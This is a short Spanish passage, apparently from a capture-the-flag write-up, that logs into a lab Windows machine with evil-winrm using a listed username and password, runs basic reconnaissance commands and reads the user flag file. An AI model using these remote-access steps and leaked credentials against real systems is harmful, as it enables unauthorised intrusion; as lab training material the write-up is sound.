## Vuln exploit & Gaining Access {-}

### Coneccion con EVIL-WINRM {-}


```bash
evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT33ve2'
whoami
ipconfig
type ../Desktop/user.txt
```

Ya podemos leer la flag.
